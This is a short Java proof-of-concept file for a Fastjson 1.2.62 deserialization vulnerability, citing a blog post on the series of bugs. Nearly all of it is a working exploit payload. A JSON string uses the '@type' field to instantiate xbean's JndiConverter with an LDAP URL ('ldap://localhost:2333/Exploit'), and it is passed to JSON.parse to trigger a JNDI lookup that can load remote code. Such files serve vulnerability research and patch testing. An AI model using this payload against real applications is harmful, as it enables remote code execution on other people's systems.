package com.firebasky.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1-2-61
 */
public class PoC_1_2_62 {
    public static void main(String[] args) {
        ////ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://localhost:2333/Exploit\"}";

        JSON.parse(poc);
    }
}
